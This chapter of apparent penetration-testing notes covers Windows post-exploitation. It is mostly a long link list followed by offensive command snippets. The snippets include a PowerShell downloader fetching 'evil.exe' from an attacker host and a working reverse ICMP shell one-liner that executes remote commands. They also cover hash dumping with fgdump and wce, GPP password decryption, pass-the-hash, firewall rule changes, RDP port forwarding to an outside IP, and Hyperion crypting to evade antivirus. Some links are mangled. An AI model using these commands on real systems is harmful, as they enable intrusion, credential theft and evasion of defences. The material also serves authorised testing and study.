# Chapter 4 - Windows Post-Exploitation

> _Practice the principle of least privilege. Do not log into a computer with administrator rights unless you must do so to perform specific tasks. Running your computer as an administrator \(or as a Power User in Windows\) leaves your computer vulnerable to security risks and exploits. Simply visiting an unfamiliar Internet site with these high-privilege accounts can cause extreme damage to your computer, such as reformatting your hard drive, deleting all your files, and creating a new user account with administrative access.” _
>
> _**— Indiana University \(Best practices for computer security\)**_

This is the phase I like to refer to as second pass enumeration or enumeration from the inside. Now that we've gained a foothold into the network it is crucial to run all of our enumeration from the ground up as an inside actor.

##### Resources

[Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)

[Windows PrivEsc Check](https://github.com/pentestmonkey/windows-privesc-check)

[Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

[Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012 … and a new network attack](https://foxglovesecurity.com/2016/01/16/hot-potato/)

[Bypassing Firewalls with Port 23](http://hkashfi.blogspot.com/2008/04/bypassing-firewalls-with-port_23.html)

[Encyclopaedia Of Windows Privilege Escalation](https://www.youtube.com/watch?v=kMG8IsCohHA)

[Level Up! Practical Windows Privilege Escalation](https://www.youtube.com/watch?v=PC_iMqiuIRQ)

[I'll get your credentials... Later! - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/18.html)

[Low-Level Windows API Access From PowerShell - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/24.html)

[Anatomy of UAC Attacks - FuzzySecurity](http://www.fuzzysecurity.com/tutorials/27.html)

[https://decoder.cloud/2017/02/11/grab-the-windows-secrets/](https://decoder.cloud/2017/02/11/grab-the-windows-secrets/)

[http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/](http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/)

[http://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/](http://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/)

[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)

[https://blog.harmj0y.net/](https://blog.harmj0y.net/)

[http://malware.dontneedcoffee.com/](http://malware.dontneedcoffee.com/)

[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

[https://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python](https://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)

[https://www.youtube.com/watch?v=6fbotSZeFkQ&list=PL-giMT7sGCVJQIgB06ock6ptjKvSc-rXc](https://www.youtube.com/watch?v=6fbotSZeFkQ&list=PL-giMT7sGCVJQIgB06ock6ptjKvSc-rXc)

[http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/](http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/)

[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)

[http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html](http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)

[https://toshellandback.com/2015/11/24/ms-priv-esc/](https://toshellandback.com/2015/11/24/ms-priv-esc/)

[https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)

[https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)

[https://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf](https://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf)

[https://cert.europa.eu/static/WhitePapers/UPDATED - CERT-EU\_Security\_Whitepaper\_2014-007\_Kerberos\_Golden\_Ticket\_Protection\_v1\_4.pdf](https://cert.europa.eu/static/WhitePapers/UPDATED - CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf)

[http://cybersecology.com/wp-content/uploads/2016/05/Golden\_Ticket-v1.13-Final.pdf](http://cybersecology.com/wp-content/uploads/2016/05/Golden_Ticket-v1.13-Final.pdf)

[https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)

[https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)

[http://www.harmj0y.net/blog/powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/](http://www.harmj0y.net/blog/powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/)

[http://www.irongeek.com/i.php?page=videos/derbycon6/118-attacking-adfs-endpoints-with-powershell-karl-fosaaen](http://www.irongeek.com/i.php?page=videos/derbycon6/118-attacking-adfs-endpoints-with-powershell-karl-fosaaen)

[https://github.com/PyroTek3/PowerShell-AD-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)

[https://github.com/mubix/netview](https://github.com/mubix/netview)

[https://hackingandsecurity.blogspot.com/2017/07/attack-methods-for-gaining-domain-admin.html?view=timeslide](https://hackingandsecurity.blogspot.com/2017/07/attack-methods-for-gaining-domain-admin.html?view=timeslide)

\[Abusing Microsoft Kerberos\]\(\[\[[https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf\]\(https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf\)\]\(https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf\]\(https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf\)\)\](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf]%28https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf%29]%28https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf]%28https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf%29%29\)\)

[https://tyranidslair.blogspot.co.uk/2017/08/the-art-of-becoming-trustedinstaller.html](https://tyranidslair.blogspot.co.uk/2017/08/the-art-of-becoming-trustedinstaller.html)

[https://github.com/hatRiot/token-priv/blob/master/abusing\_token\_eop\_1.0.txt](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)

[http://uninformed.org/?v=all&a=45&t=txt](http://uninformed.org/?v=all&a=45&t=txt)

[https://decoder.cloud/2017/02/21/the-system-challenge/](https://decoder.cloud/2017/02/21/the-system-challenge/)

[https://labs.mwrinfosecurity.com/blog/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/](https://labs.mwrinfosecurity.com/blog/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/)

[http://www.irongeek.com/i.php?page=videos/derbycon4/t122-getting-windows-to-play-with-itself-a-pen-testers-guide-to-windows-api-abuse-brady-bloxham](http://www.irongeek.com/i.php?page=videos/derbycon4/t122-getting-windows-to-play-with-itself-a-pen-testers-guide-to-windows-api-abuse-brady-bloxham)

[https://4sysops.com/archives/find-ad-users-with-empty-password-passwd\_notreqd-flag-using-powershell/](https://4sysops.com/archives/find-ad-users-with-empty-password-passwd_notreqd-flag-using-powershell/)

[https://www.youtube.com/watch?v=mPPv6\_adTyg](https://www.youtube.com/watch?v=mPPv6_adTyg)

[https://www.youtube.com/watch?v=cXWtu-qalSs](https://www.youtube.com/watch?v=cXWtu-qalSs)

[https://github.com/sensepost/rattler](https://github.com/sensepost/rattler)

[https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/](https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/)

[http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)

[https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20](https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)

[https://www.irongeek.com/i.php?page=videos/derbycon4/t109-et-tu-kerberos-christopher-campbell](https://www.irongeek.com/i.php?page=videos/derbycon4/t109-et-tu-kerberos-christopher-campbell)

[http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)

[https://www.youtube.com/watch?v=lJQn06QLwEw](https://www.youtube.com/watch?v=lJQn06QLwEw)

[http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

[http://www.malwaretech.com/2013/11/portable-executable-injection-for.html](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

[https://www.youtube.com/watch?v=8zlTv7fRjV8](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

[https://www.youtube.com/watch?v=gxWqwX7LfbU](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

[http://www.hick.org/~mmiller/presentations/misc/exploitation\_techniques\_and\_mitigations\_on\_windows.pdf](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

[https://exploit.courses/files/bfh2017/day6/0x60\_WindowsExploiting.pdf](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

[https://www.psattack.com/presentations/get-help-an-intro-to-powershell-and-how-to-use-it-for-evil/](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

[https://msdn.microsoft.com/en-us/library/windows/desktop/aa374737\(v=vs.85\).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa374737%28v=vs.85%29.aspx)

[https://github.com/subTee/windows-operating-system-archaeology](https://github.com/subTee/windows-operating-system-archaeology)

[https://blog.nextxpert.com/2013/01/31/demystifying-appcontainers-in-windows-8-part-i/](https://blog.nextxpert.com/2013/01/31/demystifying-appcontainers-in-windows-8-part-i/)

[https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=2)

[https://msdn.microsoft.com/en-us/library/windows/desktop/aa378326\(v=vs.85\).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa378326%28v=vs.85%29.aspx)

[http://jbremer.org/intercepting-system-calls-on-x86\_64-windows/](http://jbremer.org/intercepting-system-calls-on-x86_64-windows/)

[http://blog.cmpxchg8b.com/2013/05/introduction-to-windows-kernel-security.html](http://blog.cmpxchg8b.com/2013/05/introduction-to-windows-kernel-security.html)

[http://blog.ptsecurity.com/2012/12/windows-8-aslr-internals.html](http://blog.ptsecurity.com/2012/12/windows-8-aslr-internals.html)

[https://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/](https://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/)

[https://technet.microsoft.com/en-us/library/bb727030.aspx](https://technet.microsoft.com/en-us/library/bb727030.aspx)

[https://github.com/fdiskyou/injectAllTheThings/](https://github.com/fdiskyou/injectAllTheThings/)

[https://www.youtube.com/watch?v=Y8kjQEGHbAU](https://www.youtube.com/watch?v=Y8kjQEGHbAU)

[https://www.youtube.com/watch?v=V-GYPp-j-lE](https://www.youtube.com/watch?v=V-GYPp-j-lE)

##### Cross Compiling from Kali

```
Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
```

##### Transpile Python into EXE

```
Kali> python pyinstaller.py --onefile file.py
```

##### Uploading Files

```
Kali> cp /usr/share/windows-binaries/nc.exe
Kali> upx -9 nc.exe
Kali> wine exe2bat.exe nc.exe nc.txt
```

##### Powershell Foo

> ###### wget

```
echo $storageDir = $pwd > wget.ps1   
echo $webclient = New-Object System.Net.WebClient >> wget.ps1   
echo $url = "http://$ATTACKER/evil.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1    
echo $webclient.DownloadFile($url,$file) >> wget.ps1

C:\> powershell.exe -ExecutionPolicy Bypass ‐NoLogo  ‐NonInteractive  ‐NoProfile ‐File wget.ps1
```

> ###### Execute ps1

```
C:\> powershell -exec bypass -windowstyle hidden -nop -file c:\path\to\file.ps1
```

> ###### Stream contents of file

```
C:\> Get-Item /path/to/file.zip -Stream *
```

> ###### Get permissions of directory/file

```
C:\> Get-ACL C:\path\to\file\or\directory
```

> ###### Packet testing

```
# TCP
# Setup TCP Listener ie: netcat
C:\> powershell -Command '$client = New-Object System.Net.Sockets.TcpClient;$client.Connect( "10.10.14.42", 8000 );[Byte[]] $packet = [Text.Encoding]::ASCII.GetBytes("pie")$client.Send($packet, $packet.Length);$client.Close();'

# UDP
# Setup UDP Listener ie: socat
C:\> powershell -Command '$client = New-Object System.Net.Sockets.UdpClient;$client.Connect( "10.10.14.42", 8000 );[Byte[]] $packet = [Text.Encoding]::ASCII.GetBytes("pie");$client.Send($packet, $packet.Length);$client.Close();'

# ICMP
Kali> sudo python icmpsh_m.py $ATTACKER $TARGET
C:\> powershell -Command '$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $True;$packet = [Text.Encoding]::ASCII.GetBytes("pie");$client.Send("10.10.14.42", 500, $packet, $options);'
```

> ###### Reverse ICMP shell

```
Kali> sudo bash -c "echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"
Kali> sudo python icmpsh_m.py $ATTACKER $TARGET

C:\> powershell -nop -Command "$IP = '10.10.14.42';$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $true;$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes('pie'), $options);while($true){$comms = $client.Send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes(''), $options);if($comms.Buffer){ $cmd = ([Text.Encoding]::ASCII).GetString($comms.Buffer);$reply = (Invoke-Expression -Command $cmd | Out-String);$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes($reply), $options);}}"
```

[http://phrack.org/issues/49/6.html\#article](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

##### LDAP

[http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html](http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html)

##### Dump Hashes

```
C:\> fgdump.exe
C:\> type 127.0.0.1.pwdump
```

##### WCE

```
C:\> wce -w
```

##### PSExec

You need to be an admin already it copies an executable to an admin share and registers a service and starts it

[https://technet.microsoft.com/en-us/sysinternals/psexec.aspx](https://technet.microsoft.com/en-us/sysinternals/psexec.aspx)

[https://sourceforge.net/projects/winexe/](https://sourceforge.net/projects/winexe/)

[https://www.rapid7.com/db/modules/exploit/windows/smb/psexec\_psh](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh)

[http://www.powershellempire.com/?page\_id=523](http://www.powershellempire.com/?page_id=523)

##### UAC

##### [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

##### WMIC

##### [https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py)

##### Insecure File Permissions

```
C:\> icacls example.exe
```

##### [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)

##### Insecure SYSVOL

```
C:\> net use z: \\dc01\SYSVOL
Z:\> dir /s Groups.xml
Z:\> copy
Kali> gpp-decrypt
```

##### Token Stealing

Once you have admin access on a computer, you can use the tokens of the other users to access resources in the domain.

##### Passing the Hash

```
Kali> export SMBHASH="HASH"
Kali> pth-winexe -U administrator //$TARGET cmd
```

##### [https://github.com/byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

##### Passing the Ticket

> ###### TODO

##### Process Injection

##### [https://github.com/n1nj4sec/pupy](https://github.com/n1nj4sec/pupy)

##### [http://www.powershellempire.com/?page\_id=273](http://www.powershellempire.com/?page_id=273)

##### runas

##### [https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps)

##### [https://ss64.com/nt/runas.html](https://ss64.com/nt/runas.html)

##### Encapsulating SSH Traffic with httptunnel

```
# Bypass Notify with administrative account
$secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force
$mycreds = New-Object System.Management.Automtion.PSCredential("Administrator", $secpasswd)
$computer = "DEV01"
powershell -ExecutionPolicy Bypass -File c:\Windows\temp\run.ps1

# add ruleset for firewall
C:\> netsh advfirewall firewall add rule name ="httptunnel_client" dir=in action=allow program="httptunnel_client.exe enable=yes
C:\> netsh advfirewall firewall add rule name ="3000" dir=in action=allow protocol=TCP localport=3000
C:\> netsh advfirewall firewall add rule name="1080 dir=in action=allow protocol=TCP localport=1080
C:\> netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079
C:\> httptunnel_client.exe

# upload /usr/share/windows-binaries/plink.exe then setup port forward
C:\> plink -l root -pw pass -R 3389:127.0.0.1:3389 208.68.234.99 -P 3000

# Bypass Anti-virus
Kali> cp payload.exe newpayload.exe
Kali> cp /usr/share/windows-binaries/Hyperion-1.0.zip .
Kali> i586-mingw32msvc-g++ Src/Crypter/*.cpp -o hyperion.exe
Kali> wine hyperion.exe ../newpayload.exe ../crypted.exe
```

[https://github.com/secretsquirrel/SigThief](https://github.com/secretsquirrel/SigThief)

